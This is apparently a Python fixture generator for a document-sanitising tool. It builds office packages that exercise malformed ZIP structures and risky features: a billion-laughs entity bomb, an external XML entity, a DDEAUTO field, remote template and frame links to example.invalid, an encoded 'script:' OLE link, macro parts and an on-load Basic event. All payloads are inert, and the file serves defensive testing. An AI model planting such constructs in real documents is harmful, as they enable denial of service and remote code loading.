    shape = '<v:shape id="_x0000_s1025" type="#_x0000_t201"><x:ClientData ObjectType="Pict"/></v:shape>\x00'
    return zip_bytes(xlsx(sheet='<sheetData/><legacyDrawing r:id="rId1"/>', defaults=[('vml', VML)], parts=[('xl/drawings/vmlDrawing1.vml', vml_drawing(shape))],
                          sheet_rels=[rel('rId1', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml')]))


def case_xlsb(link=None, macros=False):
    workbook = biff12(131, b'') + biff12(132, b'')
    parts = [('xl/workbook.bin', workbook)]
    overrides, wb_rels = [], []
    if link:
        parts.append(('xl/externalLinks/externalLink1.bin', biff12(360, struct.pack('<H', 1) + wide(link[0]) + wide(link[1])) + biff12(361, b'')))
        overrides.append(('xl/externalLinks/externalLink1.bin', 'application/vnd.ms-excel.externalLink'))
        wb_rels.append(rel('rId2', RT + 'externalLink', 'externalLinks/externalLink1.bin'))
    if macros:
        v = vba('xlsb', 'xl')
        parts += v['parts']
        overrides += v['overrides']
        wb_rels.append(rel('rId3', MSR + 'vbaProject', 'vbaProject.bin'))
    items = [('[Content_Types].xml', types(overrides, [('bin', MAIN['xlsb'])])), ('_rels/.rels', rels(rel('rId1', RT + 'officeDocument', 'xl/workbook.bin')))]
    items += parts
    if wb_rels:
        items.append(('xl/_rels/workbook.bin.rels', rels(*wb_rels)))
    return zip_bytes(items)


def case_encoded_scheme():
    tree = '<p:graphicFrame><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole"><p:oleObj progId="Package" r:id="rId2"><p:link updateAutomatic="1"/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame>'
    return zip_bytes(pptx(tree, slide_rels=[rel('rId2', RT + 'oleObject', '%73cript:%68ttp://example.invalid/marker', True)]))


def case_configurations2(menubar):
    files = [('Configurations2/accelerator/current.xml', b'')]
    if menubar:
        files.append(('Configurations2/menubar/menubar.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<menu:menubar xmlns:menu="http://openoffice.org/2001/menu"><menu:menu menu:id=".uno:FileMenu"/></menu:menubar>'))
    return zip_bytes(odf(files=files))


def broken_docx(**changes):
    return assemble(docx_entries(**changes))


def case_two_archives():
    first = assemble(docx_entries())
    second = assemble([entry('[Content_Types].xml', MINIMAL_DOCX[0][1]), entry('_rels/.rels', MINIMAL_DOCX[1][1]), entry('word/document.xml', word_document('<w:p>%s</w:p>' % run('Second')))])
    return first + second


def case_end_in_comment():
    # The first archive's end record has a comment that runs to the end of the file and holds a second central
    # directory and end record, which list one more entry.
    es = docx_entries()
    extra = entry('word/note.xml', b'<note/>', method=0)
    whole = assemble(es + [extra])
    end_at = whole.rindex(struct.pack('<I', 0x06054b50))
    cd_offset = struct.unpack('<I', whole[end_at + 16:end_at + 20])[0]
    cd_all = whole[cd_offset:end_at]
    cd_first = cd_all[:cd_all.rindex(struct.pack('<I', 0x02014b50))]
    tail = cd_all + struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, 4, 4, len(cd_all), cd_offset + len(cd_first) + 22, 0)
    first_end = struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, 3, 3, len(cd_first), cd_offset, len(tail))
    return whole[:cd_offset] + cd_first + first_end + tail


def case_zip64_end_disagrees():
    base = assemble(docx_entries())
    end_at = base.rindex(struct.pack('<I', 0x06054b50))
    count, cd_size, cd_offset = 3, struct.unpack('<I', base[end_at + 12:end_at + 16])[0], struct.unpack('<I', base[end_at + 16:end_at + 20])[0]
    end64 = struct.pack('<IQHHIIQQQQ', 0x06064b50, 44, 45, 45, 0, 0, count, count, cd_size + 1, cd_offset - 1)
    locator = struct.pack('<IIQI', 0x07064b50, 0, end_at, 1)
    return base[:end_at] + end64 + locator + base[end_at:]


def case_encrypted_entries():
    header = b'\x00' * 11 + b'\x07'
    return assemble([entry('sample.bin', header + b'inert marker', method=0, flags=1, payload=header + b'inert marker')])


def case_deep_nesting():
    return zip_bytes(docx('<w:tbl>' + '<w:tr><w:tc><w:tbl>' * 90 + '</w:tbl></w:tc></w:tr>' * 90 + '</w:tbl>'))


def case_doc_with(part, data, base=None):
    items = base or docx('<w:p/>')
    return zip_bytes([(n, data if n == part else d) for n, d in items])


def case_hyperlinks():
    body = '<w:p><w:hyperlink r:id="rId2"><w:r><w:t>Criteria</w:t></w:r></w:hyperlink><w:hyperlink r:id="rId3"><w:r><w:t>List</w:t></w:r></w:hyperlink></w:p>'
    return zip_bytes(docx(body, part_rels={'word/document.xml': [rel('rId2', RT + 'hyperlink', 'https://example.com/files/criteria.doc', True), rel('rId3', RT + 'hyperlink', 'https://example.com/files/list.xls', True)]}))


def case_trash():
    items = docx('<w:p/>', kind='dotx')
    return zip_bytes(items + [('[trash]/0000.dat', b'inert'), ('[trash]/0001.dat', b'inert')])


def case_mimetype_not_first():
    items = odf()
    return zip_bytes(items[1:2] + items[:1] + items[2:])


def case_odf_events(media, body, files=()):
    return zip_bytes(odf(body=body, media=media, files=files))


def case_empty_href():
    """Empty hrefs, which name the document itself and nothing outside it: a form button, a text link, an image with no
    picture, and a template named only by its title."""
    meta = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-meta %s xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" '
            'xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.3"><office:meta><meta:template xlink:type="simple" '
            'xlink:actuate="onRequest" xlink:title="Normal" xlink:href=""/></office:meta></office:document-meta>' % ODF_OFFICE)
    body = ('<office:text><office:forms xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0"><form:form form:name="f">'
            '<form:button form:name="b" form:id="b1" form:button-type="push" xlink:type="simple" xlink:href=""/></form:form>'
            '</office:forms><text:p><text:a xlink:type="simple" xlink:href="">this document</text:a></text:p>'
            '<text:p><draw:frame svg:width="8cm" svg:height="2cm"><draw:image xlink:href=""><text:p/></draw:image></draw:frame></text:p></office:text>')
    return case_odf_events('text', body, files=[('meta.xml', meta.encode())])


def case_empty_events():
    """Document events bound to an empty script URL. LibreOffice runs nothing for an event whose script URL is empty."""
    names = ('office:load-finished', 'office:view-created', 'office:save', 'office:print', 'dom:unload')
    listeners = ''.join('<script:event-listener script:language="ooo:script" script:event-name="%s" xlink:href=""/>' % n for n in names)
    content = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content %s office:version="1.3"><office:scripts><office:event-listeners>%s'
               '</office:event-listeners></office:scripts><office:body><office:text><text:p>Text</text:p></office:text></office:body>'
               '</office:document-content>' % (NS_ODF, listeners)).encode()
    return zip_bytes([(n, content if n == 'content.xml' else d) for n, d in odf()])


MANIFEST_DOCTYPE = '<!DOCTYPE manifest:manifest PUBLIC "-//OpenOffice.org//DTD Manifest 1.0//EN" "Manifest.dtd">'
ODF_OFFICE = 'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"'


def old_manifest(media_type, files, xmlns):
    """A manifest as OpenOffice.org 1.x and 2.x wrote one: the document type declaration with a name and a public
    identifier and no internal subset, no manifest:version, and the media type before the path. `xmlns` declares the
    manifest prefix, or is '' when only the external DTD declared it."""
    entries = ''.join(' <manifest:file-entry manifest:media-type="%s" manifest:full-path="%s"/>\n' % (t, n) for n, t in files)
    return ('<?xml version="1.0" encoding="UTF-8"?>\n%s\n<manifest:manifest%s>\n <manifest:file-entry manifest:media-type="%s" manifest:full-path="/"/>\n%s</manifest:manifest>' % (
        MANIFEST_DOCTYPE, xmlns, media_type, entries)).encode()


def case_ooo2_text():
    """An OpenOffice.org 2.x-style text document: the stored mimetype first, empty Configurations2/ and Pictures/
    folders, a stored meta.xml, office:version 1.0, and the manifest last."""
    head = '<?xml version="1.0" encoding="UTF-8"?>\n'
    text_ns = '%s xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"' % ODF_OFFICE
    files = [
        ('Configurations2/', b''),
        ('Pictures/', b''),
        ('content.xml', (head + '\n<office:document-content %s office:version="1.0"><office:body><office:text><text:p>Text</text:p></office:text></office:body></office:document-content>' % text_ns).encode()),
        ('styles.xml', (head + '\n<office:document-styles %s office:version="1.0"/>' % text_ns).encode()),
        ('meta.xml', (head + '<office:document-meta %s xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" office:version="1.0"><office:meta><meta:generator>OpenOffice.org/2.4</meta:generator></office:meta></office:document-meta>' % ODF_OFFICE).encode()),
        ('settings.xml', (head + '\n<office:document-settings %s office:version="1.0"/>' % ODF_OFFICE).encode()),
    ]
    types = {'Configurations2/': 'application/vnd.sun.xml.ui.configuration', 'Pictures/': ''}
    manifest = old_manifest('application/vnd.oasis.opendocument.text', [(n, types.get(n, 'text/xml')) for n, _ in files],
                            ' xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"')
    es = [entry('mimetype', b'application/vnd.oasis.opendocument.text', method=0)]
    es += [entry(n, d, method=0 if n.endswith('/') or n == 'meta.xml' else 8) for n, d in files]
    return assemble(es + [entry('META-INF/manifest.xml', manifest)])


def case_sun_xml(media_type, xmlns, content_ns):
    """A package with a StarOffice media type and a manifest in the form OpenOffice.org 1.x and 2.x wrote."""
    content = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content xmlns:office="%s" office:version="1.0"><office:body/></office:document-content>' % content_ns).encode()
    return zip_bytes([('mimetype', media_type.encode()), ('content.xml', content), ('META-INF/manifest.xml', old_manifest(media_type, [('content.xml', 'text/xml')], xmlns))])


def billion_laughs(root):
    """The billion laughs: nine levels of ten references each, under a document type named `root`."""
    levels = ''.join('<!ENTITY lol%d "%s">' % (i, ('&lol%s;' % (i - 1 or '')) * 10) for i in range(1, 10))
    return '<!DOCTYPE %s [<!ENTITY lol "lol">%s]>' % (root, levels)


ODF_BASIC_FILES = [('Basic/script-lc.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<library:libraries xmlns:library="http://openoffice.org/2000/library"/>'),
                   ('Basic/Standard/Module1.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM inert marker</script:module>')]
ODF_ON_LOAD = ('<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" '
               'xlink:href="vnd.sun.star.script:Standard.Module1.Marker?language=Basic&amp;location=document"/></office:event-listeners></office:scripts>')

CASES = [
    # Fixed: packages office-defuse failed to read or misjudged.
    ('descriptor-empty-entry.ods', case_descriptor_empty_entry),
    ('zip64-streamed.ods', case_zip64_streamed),
    ('vml-conditional-markers.pptx', case_vml_markers),
    ('vml-unclosed-br.xlsx', lambda: case_vml_br()),
    ('xlsb-dde-link.xlsb', lambda: case_xlsb(link=('inert-app', 'inert topic'))),
    ('encoded-scheme-ole-link.pptx', case_encoded_scheme),
    ('empty-configurations2.odt', lambda: case_configurations2(False)),
    # Kept: what office-defuse reports, and why.
    ('configurations2-menubar.odt', lambda: case_configurations2(True)),
    ('vba-project.docm', lambda: zip_bytes(docx('<w:p/>', kind='docm', part_rels={'word/document.xml': [rel('rId2', MSR + 'vbaProject', 'vbaProject.bin')]}, **vba('docm', 'word')))),
    ('vba-template.dotm', lambda: zip_bytes(docx('<w:p/>', kind='dotm', part_rels={'word/document.xml': [rel('rId2', MSR + 'vbaProject', 'vbaProject.bin')]}, **vba('dotm', 'word')))),
    ('vba-project.xlsb', lambda: case_xlsb(macros=True)),
    ('xlm-macrosheet.xlsm', lambda: zip_bytes(xlsx(kind='xlsm', workbook_rels=[rel('rId2', MSR + 'xlMacrosheet', 'macrosheets/sheet1.xml')], overrides=[('xl/macrosheets/sheet1.xml', 'application/vnd.ms-excel.macrosheet+xml')],
                                                   parts=[('xl/macrosheets/sheet1.xml', XML_DECL + ('<xm:macrosheet xmlns="%s" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></xm:macrosheet>' % S).encode())]))),
    ('dde-field.docx', lambda: zip_bytes(docx('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO inert-app "inert topic" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'))),
    ('remote-template.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/settings.xml', ('<w:settings xmlns:w="%s" xmlns:r="%s"><w:attachedTemplate r:id="rId1"/></w:settings>' % (W, R)).encode())],
                                                    overrides=[('word/settings.xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml')],
                                                    part_rels={'word/document.xml': [rel('rId2', RT + 'settings', 'settings.xml')], 'word/settings.xml': [rel('rId1', RT + 'attachedTemplate', 'https://example.invalid/template.dotm', True)]}))),
    ('local-template.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/settings.xml', ('<w:settings xmlns:w="%s" xmlns:r="%s"><w:attachedTemplate r:id="rId1"/></w:settings>' % (W, R)).encode())],
                                                   overrides=[('word/settings.xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml')],
                                                   part_rels={'word/document.xml': [rel('rId2', RT + 'settings', 'settings.xml')], 'word/settings.xml': [rel('rId1', RT + 'attachedTemplate', 'Normal.dotm', True)]}))),
    ('remote-frame.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/webSettings.xml', ('<w:webSettings xmlns:w="%s" xmlns:r="%s"><w:frameset><w:frame><w:sourceFileName r:id="rId1"/></w:frame></w:frameset></w:webSettings>' % (W, R)).encode())],
                                                 overrides=[('word/webSettings.xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.webSettings+xml')],
                                                 part_rels={'word/document.xml': [rel('rId2', RT + 'webSettings', 'webSettings.xml')], 'word/webSettings.xml': [rel('rId1', RT + 'frame', 'https://example.invalid/frame.html', True)]}))),
    ('ole-object.xlsx', lambda: zip_bytes(xlsx(sheet='<sheetData/><oleObjects><oleObject progId="Package" shapeId="1025" r:id="rId1"/></oleObjects>', parts=[('xl/embeddings/oleObject1.bin', MARKER_OLE)],
                                               overrides=[('xl/embeddings/oleObject1.bin', 'application/vnd.openxmlformats-officedocument.oleObject')],
                                               sheet_rels=[rel('rId1', RT + 'oleObject', '../embeddings/oleObject1.bin')]))),
    ('activex-control.xlsx', lambda: zip_bytes(xlsx(sheet='<sheetData/><controls><control shapeId="1025" r:id="rId1" name="ShockwaveFlash1"/></controls>', parts=activex('xl')[0], overrides=activex('xl')[1],
                                                    sheet_rels=[rel('rId1', RT + 'control', '../activeX/activeX1.xml')]))),
    ('chart-workbook.docx', lambda: zip_bytes(docx('<w:p/>', parts=[('word/charts/chart1.xml', ('<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" xmlns:r="%s"><c:externalData r:id="rId1"/></c:chartSpace>' % R).encode()),
                                                                   ('word/embeddings/Workbook1.xlsx', zip_bytes(xlsx()))],
                                                   overrides=[('word/charts/chart1.xml', 'application/vnd.openxmlformats-officedocument.drawingml.chart+xml')],
                                                   defaults=[('xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')],
                                                   part_rels={'word/document.xml': [rel('rId2', RT + 'chart', 'charts/chart1.xml')], 'word/charts/chart1.xml': [rel('rId1', RT + 'package', '../embeddings/Workbook1.xlsx')]}))),
    ('ribbon-callbacks.xlsm', lambda: zip_bytes(xlsx(kind='xlsm', package_rels=[rel('rId2', 'http://schemas.microsoft.com/office/2007/relationships/ui/extensibility', 'customUI/customUI14.xml')],
                                                     parts=[('customUI/customUI14.xml', b'<customUI xmlns="http://schemas.microsoft.com/office/2009/07/customui"><ribbon><tabs><tab id="t1" label="Tools"><group id="g1" label="Run"><button id="b1" label="Bold" onAction="MarkerSub"/></group></tab></tabs></ribbon></customUI>')]))),
    ('hyperlinks-only.docx', case_hyperlinks),
    ('trash-parts.dotx', case_trash),
    ('mimetype-not-first.odt', case_mimetype_not_first),
    ('event-empty-script.odt', case_empty_events),
    ('link-empty-href.odt', case_empty_href),
    ('odf-basic-on-load.odt', lambda: case_odf_events('text', ODF_ON_LOAD + '<office:text><text:p>Text</text:p></office:text>', ODF_BASIC_FILES)),
    ('odf-navigation-events.odp', lambda: case_odf_events('presentation', '<office:presentation><draw:page draw:name="p1"><draw:rect svg:width="1cm" svg:height="1cm"><office:event-listeners><presentation:event-listener script:event-name="dom:click" presentation:action="next-page"/></office:event-listeners></draw:rect></draw:page></office:presentation>')),
    ('odf-script-url-link.odp', lambda: case_odf_events('presentation', '<office:presentation><draw:page draw:name="p1"><draw:frame svg:width="2cm" svg:height="1cm"><draw:text-box><text:p><text:a xlink:href="javascript:void(0)">x</text:a></text:p></draw:text-box></draw:frame></draw:page></office:presentation>')),
    # Refused on purpose: the container, the XML or the format is one office-defuse does not read.
    ('truncated.docx', lambda: broken_docx()[:300]),
    ('comment-past-end.zip', lambda: assemble(docx_entries(), eocd={'comment_length': 200})),
    ('directory-outside-file.docx', lambda: assemble(docx_entries(), cd_offset_delta=100000)),
    ('two-archives.docx', case_two_archives),
    ('utf8-flag-mismatch.xlsx', lambda: assemble([dict(e, lfh={'flags': 0x0800}) if e['name'] == '_rels/.rels' else e for e in entries_of(xlsx())])),
    ('descriptor-flag-no-descriptor.odt', lambda: assemble([dict(e, flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}) if e['name'] == 'content.xml' else e for e in entries_of(odf())])),
    ('local-name-differs.docx', lambda: broken_docx(lfh={'name': b'word/aaaaaaaaaaaa.xml'})),
    ('duplicate-name-case.xlsx', lambda: assemble(entries_of(xlsx()) + [entry('xl/worksheets/Sheet1.xml', b'<x/>')])),
    ('encrypted-entries.zip', case_encrypted_entries),
    ('unicode-path-field.docx', lambda: assemble(docx_entries(cd_extra=struct.pack('<HHBI', 0x7075, 5 + 13, 1, zlib.crc32(b'word/document.xml') & 0xffffffff) + b'word/othe.xml'))),
    ('backslash-names.xlsx', lambda: assemble([dict(e, name=e['name'].replace('xl/', 'xl\\', 1)) if e['name'].startswith('xl/') and e['name'] != 'xl/workbook.xml' else e for e in entries_of(xlsx())])),
    ('dot-slash-name.docx', lambda: assemble([dict(e, name='./' + e['name']) if e['name'] == 'word/document.xml' else e for e in docx_entries()])),
    ('leading-slash-name.odt', lambda: assemble([dict(e, name='/' + e['name']) if e['name'] == 'content.xml' else e for e in entries_of(odf())])),
    ('end-record-in-comment.docx', case_end_in_comment),
    ('one-byte-local-extra.docx', lambda: broken_docx(lfh_extra=b'\x0a')),
    ('wrong-crc.docx', lambda: broken_docx(lfh={'crc': 0x0badc0de}, cd={'crc': 0x0badc0de})),
    ('zip64-end-disagrees.docx', case_zip64_end_disagrees),
    # Document types: information without an internal subset, removable with one, and limits on its entities.
    ('manifest-doctype.odt', case_ooo2_text),
    ('math-object-doctype.odt', lambda: zip_bytes(odf(body='<office:text><text:p><draw:frame><draw:object xlink:href="./Object 1"/></draw:frame></text:p></office:text>',
                                                      files=[('Object 1/content.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE math:math PUBLIC "-//OpenOffice.org//DTD Modified W3C MathML 1.01//EN" "math.dtd"><math:math xmlns:math="http://www.w3.org/1998/Math/MathML"><math:mi>A</math:mi></math:math>')]))),
    ('external-entity-in-text.docx', lambda: zip_bytes([(n, d.replace(b'?>\n', b'?>\n<!DOCTYPE w:document [<!ENTITY marker SYSTEM "https://example.invalid/marker.xml">]>', 1) if n == 'word/document.xml' else d)
                                                        for n, d in docx('<w:p>%s</w:p>' % run('&marker;'))])),
    ('billion-laughs.xlsx', lambda: zip_bytes(xlsx(parts=[('xl/sharedStrings.xml', XML_DECL + ('%s<sst xmlns="%s" count="1" uniqueCount="1"><si><t>&lol9;</t></si></sst>' % (billion_laughs('sst'), S)).encode())],
                                                   overrides=[('xl/sharedStrings.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml')], workbook_rels=[rel('rId2', RT + 'sharedStrings', 'sharedStrings.xml')]))),
    ('manifest-prefix-from-dtd.odb', lambda: case_sun_xml('application/vnd.sun.xml.base', '', 'urn:oasis:names:tc:opendocument:xmlns:office:1.0')),
    ('sun-xml-calc.ods', lambda: case_sun_xml('application/vnd.sun.xml.calc', ' xmlns:manifest="http://openoffice.org/2001/manifest"', 'http://openoffice.org/2000/office')),
    ('undeclared-prefix.odt', lambda: zip_bytes([(n, d.replace(b' ' + NS_ODF.split(' ')[0].encode(), b'') if n == 'content.xml' else d) for n, d in odf()])),
    ('unclosed-root.odt', lambda: zip_bytes([(n, d.replace(b'</office:document-content>', b'') if n == 'content.xml' else d) for n, d in odf()])),
    ('mismatched-end-tag.docx', lambda: case_doc_with('word/document.xml', word_document('<w:p><w:r><w:t>x</w:r></w:t></w:p>'))),
    ('duplicate-attribute.docx', lambda: case_doc_with('word/document.xml', word_document('<w:p><w:pPr><w:jc w:val="left" w:val="right"/></w:pPr></w:p>'))),
    ('empty-main-part.ppam', lambda: zip_bytes([(n, b'' if n == 'ppt/presentation.xml' else d) for n, d in pptx(kind='ppam')])),
    ('text-outside-root.xlsx', lambda: zip_bytes([(n, d + b'garbage' if n == '_rels/.rels' else d) for n, d in xlsx()])),
    ('vml-nul-character.xlsx', case_vml_nul),
    ('deep-nesting.docx', case_deep_nesting),
    ('encrypted-package.odt', lambda: zip_bytes(odf(manifest_extra='<manifest:file-entry manifest:full-path="secret.xml" manifest:media-type="text/xml"><manifest:encryption-data manifest:checksum-type="SHA1/1K" manifest:checksum="AAAA"/></manifest:file-entry>'))),
    ('xps-document.xps', lambda: zip_bytes([('[Content_Types].xml', types([('FixedDocumentSequence.fdseq', 'application/vnd.ms-package.xps-fixeddocumentsequence+xml')])),
                                            ('_rels/.rels', rels(rel('rId1', 'http://schemas.microsoft.com/xps/2005/06/fixedrepresentation', 'FixedDocumentSequence.fdseq'))),
                                            ('FixedDocumentSequence.fdseq', b'<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06"/>')])),
    ('metadata-only.zip', lambda: zip_bytes([('[Content_Types].xml', types([('docProps/core.xml', 'application/vnd.openxmlformats-package.core-properties+xml')])),
                                             ('_rels/.rels', rels(rel('rId1', 'http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties', 'docProps/core.xml'))),
                                             ('docProps/core.xml', b'<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>')])),
    ('theme-package.docx', lambda: zip_bytes([(n, d.replace(MAIN['docx'].encode(), b'application/vnd.openxmlformats-officedocument.themeManager+xml') if n == '[Content_Types].xml' else d) for n, d in docx('<w:p/>')])),
    ('plain-archive.zip', lambda: zip_bytes([('a.txt', b'a'), ('b.txt', b'b')])),
    ('empty-archive.xlsx', lambda: assemble([])),
    ('odf-inside-folder.odt', lambda: zip_bytes([('package/' + n, d) for n, d in odf()])),
    ('mimetype-not-media-type.odt', lambda: zip_bytes([(n, b'\x89PNG\r\n\x1a\n' if n == 'mimetype' else d) for n, d in odf()])),
]


def cases():
    """Writes test/fixtures/cases. Needs nothing but Python. manifest.json, which describes each file, is kept."""
    folder = os.path.join(OUT, 'cases')
    os.makedirs(folder, exist_ok=True)
    for name in os.listdir(folder):
        if name != 'manifest.json':
            os.remove(os.path.join(folder, name))
    for name, build in CASES:
        with open(os.path.join(folder, name), 'wb') as f:
            f.write(build())


def main():
    try:
        if sys.argv[1:] != ['cases']:
            for sub in ('lo', 'docs', 'zip'):
                shutil.rmtree(os.path.join(OUT, sub), ignore_errors=True)
            soffice_exports()
            docs()
            zips()
        cases()
    finally:
        shutil.rmtree(TMP, ignore_errors=True)
    count = sum(len(files) for _, _, files in os.walk(OUT))
    print('wrote %d fixtures under %s' % (count, OUT))


if __name__ == '__main__':
    main()
